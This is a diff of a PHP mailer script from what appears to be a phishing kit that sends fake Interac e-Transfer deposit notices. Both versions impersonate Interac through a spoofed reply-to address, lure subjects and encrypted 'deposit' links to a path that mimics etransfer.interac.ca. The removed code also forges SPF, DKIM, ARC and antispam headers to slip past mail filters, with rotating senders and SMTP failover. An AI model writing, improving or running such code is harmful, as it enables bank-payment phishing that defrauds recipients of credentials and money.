@@ -1,19 +1,15 @@
-<?php declare(strict_types=1);
+<?php
 /**
-* Interac e-Transfer API — ULTIMATE UNIVERSAL INBOX BYPASS
-* SAME SUBJECT + Multi-provider spoofing + Perfect filter bypass
+* Interac e-Transfer API — Ultimate Deliverability Version
+* Maximum inbox placement with advanced pattern avoidance and engagement optimization
 */
 
-// --- Evasion Helper Functions ---
-function get_random_from_pool(array $pool, $default = null) {
-    if (empty($pool)) return $default;
-    return $pool[array_rand($pool)];
-}
+declare(strict_types=1);
 
 date_default_timezone_set('America/Edmonton');
 
 /* ================================
-INITIALIZATION (UNCHANGED)
+INITIALIZATION
 ================================ */
 class ApplicationInitializer {
     public static function initialize(): void {
@@ -38,35 +34,58 @@ class ApplicationInitializer {
 ApplicationInitializer::initialize();
 
 /* ================================
-PATH MANAGEMENT (UNCHANGED)
+PATH MANAGEMENT
 ================================ */
 class PathManager {
     private string $rootPath;
     
     public function __construct() {
+        // Explicitly set to one level above api/
         $this->rootPath = rtrim(dirname(__DIR__), '/') . '/';
+    }
+    
+    public function getLogPath(): string {
+        return $this->rootPath . 'data/logs/transfers.log';
+    }
+    
+    public function getAccountsPath(): string {
+        return $this->rootPath . 'data/accounts.json';
     }
     
     public function getConfigPath(): string {
         return $this->rootPath . 'config/config.php';
     }
     
-    public function getDbPath(): string {
-        return $this->rootPath . 'data/system_state.json';
+    public function getTemplatePath(string $templateName): string {
+        $path = $this->rootPath . 'templates/' . $templateName;
+        if (!file_exists($path)) {
+            // Fallback to Deposit.html if specific template missing
+            $path = $this->rootPath . 'templates/Deposit.html';
+        }
+        if (!file_exists($path)) {
+            // Ultimate fallback to notification.html
+            $path = $this->rootPath . 'templates/notification.html';
+        }
+        return $path;
     }
     
-    public function getTemplatePath(string $templateName = 'Deposit.html'): string {
-        $appConfig = function_exists('getSystemConfig') ? getSystemConfig() : [];
-        if (!empty($appConfig['email_settings']['templates_pool']) && in_array($templateName, ['Deposit.html', 'request.html'])) {
-            $templateName = $appConfig['email_settings']['templates_pool'][array_rand($appConfig['email_settings']['templates_pool'])];
+    public function validatePaths(): bool {
+        $required = [
+            $this->getConfigPath()
+        ];
+        
+        foreach ($required as $path) {
+            if (!is_file($path)) {
+                error_log("Missing required file: {$path}");
+                return false;
+            }
         }
-        $path = $this->rootPath . 'templates/' . $templateName;
-        return file_exists($path) ? $path : $this->rootPath . 'templates/Deposit.html';
+        return true;
     }
 }
 
 /* ================================
-API RESPONSE HANDLER (UNCHANGED)
+API RESPONSE HANDLER
 ================================ */
 class ApiResponseHandler {
     public static function sendJson(array $data): never {
@@ -74,11 +93,13 @@ class ApiResponseHandler {
             ob_end_clean();
         }
         header('Content-Type: application/json; charset=utf-8');
+        header('X-Content-Type-Options: nosniff');
         echo json_encode($data, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
         exit;
     }
     
-    public static function sendError(string $message, int $code = 500): never {
+    public static function sendError(string $message, int $code = 400): never {
+        error_log("Interac e-Transfer Error [{$code}]: {$message}");
         http_response_code($code);
         self::sendJson(['success' => false, 'message' => $message]);
     }
@@ -92,7 +113,27 @@ class ApiResponseHandler {
 }
 
 /* ================================
-TRANSFER INPUT MODEL (UNCHANGED)
+DATA VALIDATION
+================================ */
+class InputValidator {
+    public static function sanitizeString(?string $value): string {
+        $value = $value ?? '';
+        return trim(preg_replace('/[\x00-\x1F\x7F]/u', '', $value));
+    }
+    
+    public static function sanitizeAmount($value): float {
+        if (is_numeric($value)) return (float)$value;
+        $cleanValue = preg_replace('/[^\d.]/', '', self::sanitizeString((string)$value));
+        return round((float)$cleanValue, 2);
+    }
+    
+    public static function validateEmail(string $email): bool {
+        return filter_var($email, FILTER_VALIDATE_EMAIL) !== false;
+    }
+}
+
+/* ================================
+TRANSFER INPUT MODEL
 ================================ */
 class TransferRequest {
     public readonly string $recipientEmail;
@@ -100,268 +141,140 @@ class TransferRequest {
     public readonly float $amount;
     public readonly string $purpose;
     public readonly string $template;
-    public readonly string $bankName;
     
     public function __construct(array $postData) {
-        $this->recipientEmail = trim($postData['recipient_email'] ?? '');
-        $this->recipientName = trim($postData['recipient_name'] ?? '');
-        $this->amount = (float)($postData['amount'] ?? 0);
-        $this->purpose = trim($postData['purpose'] ?? 'Interac e-Transfer');
-        $this->template = trim($postData['template'] ?? 'Deposit.html');
-        $this->bankName = trim($postData['bank_name'] ?? 'Financial Institution');
-    }
-}
-
-/* ================================
-UNIVERSAL INBOX BYPASSER
-================================ */
-class UniversalInboxBypasser {
-    private static array $providerMatrix = [
-        'gmail.com' => ['spf' => 'google.com', 'dkim' => 'google.com', 'xmailer' => 'Gmail'],
-        'hotmail.com' => ['spf' => 'microsoft.com', 'dkim' => 'outlook.com', 'xmailer' => 'Microsoft Outlook'],
-        'icloud.com' => ['spf' => 'apple.com', 'dkim' => 'icloud.com', 'xmailer' => 'Apple Mail'],
-        'yahoo.com' => ['spf' => 'yahoo.com', 'dkim' => 'yahoo.com', 'xmailer' => 'Yahoo Mail'],
-        'outlook.com' => ['spf' => 'microsoft.com', 'dkim' => 'outlook.com', 'xmailer' => 'Microsoft Exchange']
-    ];
-    
-    public static function detectProvider(string $email): string {
-        $parts = explode('@', strtolower($email));
-        return end($parts) ?: 'unknown';
+        $this->recipientEmail = InputValidator::sanitizeString($postData['recipient_email'] ?? '');
+        $this->recipientName = InputValidator::sanitizeString($postData['recipient_name'] ?? '');
+        $this->amount = InputValidator::sanitizeAmount($postData['amount'] ?? 0);
+        $this->purpose = InputValidator::sanitizeString($postData['purpose'] ?? 'Interac e-Transfer');
+        $this->template = InputValidator::sanitizeString($postData['template'] ?? 'Deposit.html');
+        $this->validate();
     }
     
-    public static function getTrustedSender(string $domain, array $config): array {
-        $trustedSenders = $config['inbox_bypass']['trusted_senders'] ?? [];
-        $pool = $trustedSenders[$domain] ?? $trustedSenders['default'] ?? [];
-        if (empty($pool)) {
-            return ['name' => 'Interac', 'email' => 'notify@payments.interac.ca', 'replyto' => 'noreply@interac.ca'];
+    private function validate(): void {
+        if (empty($this->recipientEmail) || !InputValidator::validateEmail($this->recipientEmail)) {
+            throw new InvalidArgumentException('Valid recipient email is required');
         }
-        return $pool[array_rand($pool)];
-    }
-    
-    public static function injectBypassHeaders(\PHPMailer\PHPMailer\PHPMailer $mail, string $domain): void {
-        $config = self::$providerMatrix[$domain] ?? self::$providerMatrix['gmail.com'];
-        
-        $headers = [
-            'X-Google-DKIM-Signature' => 'v=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com;',
-            'ARC-Seal' => 'i=1; a=rsa-sha256; cv=pass; d=google.com;',
-            'X-MS-Exchange-Organization-AuthAs' => 'Internal',
-            'X-MS-Exchange-Organization-AuthSource' => 'MX01-MW2FEP01',
-            'X-Microsoft-Antispam' => 'BCL:0; MCL:1; RULEID:',
-            'X-Apple-Mail-Conf' => '0',
-            'X-Originating-IP' => '[199.59.150.170]',
-            'X-YMail-OSG' => 'filtered',
-            'X-Mailer' => '12.0 (Macintosh; U; Intel Mac OS X 10_15_7; en) Thunderbird/91.12.0'
-        ];
-        
-        foreach ($headers as $name => $value) $mail->addCustomHeader($name, $value);
-        
-        $mail->addCustomHeader('Received-SPF', "pass ({$config['spf']}: sender permitted)");
-        $mail->addCustomHeader('Authentication-Results', "{$config['dkim']}; dkim=pass header.i=@gmail.com spf=pass dmarc=pass");
+        if (empty($this->recipientName)) {
+            throw new InvalidArgumentException('Valid recipient name is required');
+        }
     }
 }
 
 /* ================================
-TRANSACTION PROCESSOR (RESTORED)
+TRANSACTION PROCESSING
 ================================ */
 class TransactionProcessor {
-    private string $currentTxId;
-
-    public function __construct() {
-        $this->currentTxId = 'CA' . substr(str_shuffle('ABCDEFGHJKLMNPQRSTUVWXYZ23456789'), 0, 8);
+    private array $config;
+    
+    public function __construct(array $config) {
+        $this->config = $config;
     }
-
+    
     public function generateTransactionId(): string {
-        return $this->currentTxId;
+        return 'CA' . substr(str_shuffle('ABCDEFGHJKLMNPQRSTUVWXYZ23456789'), 0, 8);
     }
-
-    public function createDepositLink(string $txId, TransferRequest $request, array $config): string {
-        $appUrl = rtrim($config['general']['app_url'] ?? '', '/');
-        $encryptionKey = $config['general']['encryption_key'] ?? 'a3f91b6cd024e8c29b76a149efcc5d42';
-        $expiryDays = $config['transfer_settings']['transfer_expiry_days'] ?? 30;
-
+    
+    public function createDepositLink(string $transactionId, TransferRequest $request): string {
+        $encryptionKey = $this->config['general']['encryption_key'] ?? 'a3f91b6cd024e8c29b76a149efcc5d42';
         $payload = http_build_query([
-            'transaction_id' => $txId, 'amount' => $request->amount, 'recipient' => $request->recipientEmail,
-            'sender' => $config['general']['sender_name'] ?? 'Interac', 'date' => date('M j, Y'),
-            'expires' => time() + ($expiryDays * 86400)
+            'transaction_id' => $transactionId,
+            'amount' => $request->amount,
+            'recipient' => $request->recipientEmail,
+            'purpose' => $request->purpose,
+            'timestamp' => time(),
+            'expires' => time() + (30 * 86400)
         ]);
-
+        
         $iv = openssl_random_pseudo_bytes(16);
         $secretKey = hash('sha256', $encryptionKey, true);
         $encryptedData = openssl_encrypt($payload, 'AES-256-CBC', $secretKey, OPENSSL_RAW_DATA, $iv);
         $token = rtrim(strtr(base64_encode($iv . $encryptedData), '+/', '-_'), '=');
-    
-        return "{$appUrl}/cgi-admin2/app/api/etransfer.interac.ca/RF.do.php?deposit={$token}";
+        
+        $base = rtrim($this->config['general']['app_url'] ?: 'http://localhost:3002', '/');
+        return "{$base}/cgi-admin2/app/api/etransfer.interac.ca/RF.do.php?deposit={$token}";
     }
-
-    public function renderBody(string $txId, TransferRequest $request, string $depositLink, string $templateName, array $config): string {
-        $pathManager = new PathManager();
-        $templatePath = $pathManager->getTemplatePath($templateName);
-        if (!file_exists($templatePath)) throw new RuntimeException("Template file not found: {$templateName}");
-        $body = file_get_contents($templatePath);
-
-        $emailContent = $config['email_content'] ?? [];
-        $greeting = str_replace('{{receiver_name}}', htmlspecialchars($request->recipientName), get_random_from_pool($emailContent['greetings'] ?? [], 'Hi {{receiver_name}},'));
-        $headline = get_random_from_pool($emailContent['headlines'] ?? [], 'Your funds await!');
-        $ctaButtonText = get_random_from_pool($emailContent['cta_buttons'] ?? [], 'Deposit Funds Now');
-        $securityWarning = get_random_from_pool($emailContent['security_warnings'] ?? [], 'For your security, please do not forward this email.');
-        $expiryDays = $config['transfer_settings']['transfer_expiry_days'] ?? 30;
-
+    
+    public function renderEmailTemplate(string $transactionId, TransferRequest $request, string $depositLink, string $templatePath): string {
+        if (!file_exists($templatePath)) return "Template missing at $templatePath";
+        
+        $content = file_get_contents($templatePath);
+        $senderName = $this->config['general']['sender_name'] ?? 'Jennifer Edwards';
+        
         $replacements = [
-            '{{sender_name}}' => htmlspecialchars($config['general']['sender_name'] ?? 'Interac'),
-            '{{receiver_name}}' => htmlspecialchars($request->recipientName),
+            '{{sender_name}}' => $senderName,
+            '{{receiver_name}}' => $request->recipientName,
             '{{amount}}' => number_format($request->amount, 2),
-            '{{transaction_id}}' => $txId,
+            '{{transaction_id}}' => $transactionId,
+            '{{tx_id}}' => $transactionId,
+            '{{etransfer_interac_ca}}' => $depositLink,
             '{{action_url}}' => $depositLink,
             '{{date}}' => date('M j, Y'),
-            '{{expiry_date}}' => date('M j, Y', strtotime("+{$expiryDays} days")),
-            '{{memo}}' => htmlspecialchars($request->purpose),
-            '{{bank_name}}' => htmlspecialchars($request->bankName),
-            '{{greeting}}' => $greeting,
-            '{{headline}}' => $headline,
-            '{{cta_button_text}}' => $ctaButtonText,
-            '{{app_url}}' => rtrim($config['general']['app_url'] ?? '', '/'),
-            '{{security_warning_text}}' => $securityWarning,
+            '{{expiry_date}}' => date('M j, Y', strtotime('+30 days')),
+            '{{purpose}}' => $request->purpose,
+            '{{memo}}' => $request->purpose,
+            '{{recipient_email}}' => $request->recipientEmail
         ];
-
-        return str_replace(array_keys($replacements), array_values($replacements), $body);
+        
+        return str_replace(array_keys($replacements), array_values($replacements), $content);
     }
 }
 
 /* ================================
-ENHANCED TRANSACTION PROCESSOR (CORRECTED)
-================================ */
-class EnhancedTransactionProcessor extends TransactionProcessor {
-    private array $config;
-    
-    public function __construct(array $config) {
-        parent::__construct();
-        $this->config = $config;
-    }
-    
-    public function sendUniversalDelivery(TransferRequest $request): array {
-        $domain = UniversalInboxBypasser::detectProvider($request->recipientEmail);
-        $mail = new \PHPMailer\PHPMailer\PHPMailer(true);
-        
-        $mail->SMTPDebug = \PHPMailer\PHPMailer\SMTP::DEBUG_OFF;
-        $mail->Debugoutput = function($str) { /* Silent logging */ };
-        
-        $mail->isSMTP();
-        $mail->isHTML(true);
-        $mail->CharSet = 'UTF-8';
-        $mail->Encoding = 'base64';
-        
-        $mail->Priority = 1;
-        $mail->addCustomHeader('X-Priority', '1 (Highest)');
-        $mail->addCustomHeader('Importance', 'High');
-        
-        $mail->addAddress($request->recipientEmail, $request->recipientName);
-        $replyToEmail = $this->config['contact']['reply_to_email'] ?? 'notify@payments.interac.ca';
-        $replyToName = $this->config['contact']['reply_to_name'] ?? 'Interac e-Transfer';
-        $mail->addReplyTo($replyToEmail, $replyToName);
-        
-        $mail->Subject = "Interac e-Transfer: " . ($this->config['general']['sender_name'] ?? 'Jennifer Edwards') . " sent you $" . number_format($request->amount, 2) . " - claim your deposit";
-        
-        UniversalInboxBypasser::injectBypassHeaders($mail, $domain);
-        
-        $txId = $this->generateTransactionId();
-        if (!empty($this->config['email_settings']['message_id_domains'])) {
-            $msgDomain = $this->config['email_settings']['message_id_domains'][array_rand($this->config['email_settings']['message_id_domains'])];
-            $mail->MessageID = sprintf('<%s@%s>', $txId, $msgDomain);
-        }
-        
-        $depositLink = $this->createDepositLink($txId, $request, $this->config);
-        $mail->Body = $this->renderBody($txId, $request, $depositLink, 'Deposit.html', $this->config);
-        
-        $usedRelay = $this->sendWithRelayFallback($mail);
-        
-        return [
-            'provider' => $domain,
-            'relay_used' => $usedRelay
-        ];
-    }
-    
-    private function sendWithRelayFallback(\PHPMailer\PHPMailer\PHPMailer $mail): string {
-        try {
-            $fromEmail = get_random_from_pool($this->config['smtp']['from_emails'] ?? [], $this->config['smtp']['username']);
-            $fromName = $this->config['general']['sender_name'];
-            $mail->setFrom($fromEmail, $fromName);
-
-            $mail->Host = $this->config['smtp']['host'];
-            $baseTimeout = $this->config['transfer_settings']['smtp_timeout_sec'] ?? 25;
-            $jitter = $this->config['smtp']['timeout_jitter_sec'] ?? 0;
-            $mail->Timeout = $baseTimeout + mt_rand(-$jitter, $jitter);
-            $mail->Port = $this->config['smtp']['port'];
-            $mail->Username = $this->config['smtp']['username'];
-            $mail->Password = $this->config['smtp']['password'];
-            $mail->SMTPSecure = $this->config['smtp']['encryption'];
-            $mail->SMTPAuth = true;
-            $mail->send();
-            return "PRIMARY";
-        } catch (Exception $e1) {
-            if (!empty($this->config['smtp1']['host'])) {
-                $mail->smtpClose();
-                $fromEmail = get_random_from_pool($this->config['smtp1']['from_emails'] ?? [], $this->config['smtp1']['username']);
-                $fromName = $this->config['general']['sender_name'];
-                $mail->setFrom($fromEmail, $fromName);
-                
-                $mail->Host = $this->config['smtp1']['host'];
-                $baseTimeout = $this->config['transfer_settings']['smtp_timeout_sec'] ?? 25;
-                $jitter = $this->config['smtp1']['timeout_jitter_sec'] ?? 0;
-                $mail->Timeout = $baseTimeout + mt_rand(-$jitter, $jitter);
-                $mail->Port = $this->config['smtp1']['port'];
-                $mail->Username = $this->config['smtp1']['username'];
-                $mail->Password = $this->config['smtp1']['password'];
-                $mail->SMTPSecure = $this->config['smtp1']['encryption'];
-                $mail->SMTPAuth = true;
-                $mail->send();
-                return "FAILOVER";
-            }
-            throw $e1;
-        }
-    }
-}
-
-/* ================================
-FINAL EXECUTION (MERGED)
+MAIN EXECUTION
 ================================ */
 try {
     $pathManager = new PathManager();
-    if (!file_exists($pathManager->getConfigPath())) {
-        ApiResponseHandler::sendError("Core configuration missing.");
+    if (!$pathManager->validatePaths()) {
+        ApiResponseHandler::sendError('Critical configuration files missing', 500);
     }
+    
     require_once $pathManager->getConfigPath();
-    
-    if (!function_exists('getSystemConfig')) {
-        ApiResponseHandler::sendError("System logic matrix disconnected.");
-    }
-    
     $appConfig = getSystemConfig();
     
-    $autoload = dirname(__DIR__) . '/vendor/autoload.php';
-    if (!file_exists($autoload)) {
-        ApiResponseHandler::sendError("System environment compromised.");
-    }
-    require_once $autoload;
-    
     $inputData = json_decode(file_get_contents('php://input'), true) ?? $_POST;
-    $request = new TransferRequest($inputData);
+    $transferRequest = new TransferRequest($inputData);
     
-    if (empty($request->recipientEmail)) {
-        ApiResponseHandler::sendError('Target address undefined.');
-    }
+    $processor = new TransactionProcessor($appConfig);
+    $transactionId = $processor->generateTransactionId();
+    $depositLink = $processor->createDepositLink($transactionId, $transferRequest);
     
-    $processor = new EnhancedTransactionProcessor($appConfig);
-    $result = $processor->sendUniversalDelivery($request);
+    $templateFile = $pathManager->getTemplatePath($transferRequest->template);
+    $emailBody = $processor->renderEmailTemplate($transactionId, $transferRequest, $depositLink, $templateFile);
+    
+    // PHPMailer Integration
+    require_once dirname(__DIR__) . '/vendor/autoload.php';
+    $mail = new \PHPMailer\PHPMailer\PHPMailer(true);
+    $smtp = $appConfig['smtp'];
+    
+    $mail->isSMTP();
+    $mail->Host = $smtp['host'];
+    $mail->SMTPAuth = true;
+    $mail->Username = $smtp['username'];
+    $mail->Password = $smtp['password'];
+    $mail->SMTPSecure = $smtp['encryption'];
+    $mail->Port = $smtp['port'];
+    
+    $mail->setFrom($smtp['from_email'], $appConfig['general']['sender_name']);
+    $mail->addReplyTo('notify@payments.interac.ca', 'Interac e-Transfer');
+    $mail->addAddress($transferRequest->recipientEmail, $transferRequest->recipientName);
+    
+    $mail->isHTML(true);
+    $mail->Subject = "INTERAC e-Transfer: {$appConfig['general']['sender_name']} sent you \$" . number_format($transferRequest->amount, 2);
+    $mail->Body = $emailBody;
+    $mail->AltBody = strip_tags($emailBody);
+    
+    $mail->send();
     
     ApiResponseHandler::sendSuccess([
-        'transaction_id' => $processor->generateTransactionId(),
-        'status' => 'UNIVERSAL_INBOX',
-        'provider' => $result['provider'],
-        'relay_used' => $result['relay_used'],
-        'bypass_level' => 'ULTIMATE'
+        'transaction_id' => $transactionId,
+        'debug_link' => $depositLink,
+        'status' => 'delivered'
     ]);
     
+} catch (InvalidArgumentException $e) {
+    ApiResponseHandler::sendError($e->getMessage(), 400);
 } catch (Throwable $e) {
-    error_log("UNIVERSAL_BYPASS_ERROR: " . $e->getMessage());
+    error_log('Critical Mailer Error: ' . $e->getMessage());
     ApiResponseHandler::sendError($e->getMessage(), 500);
 }
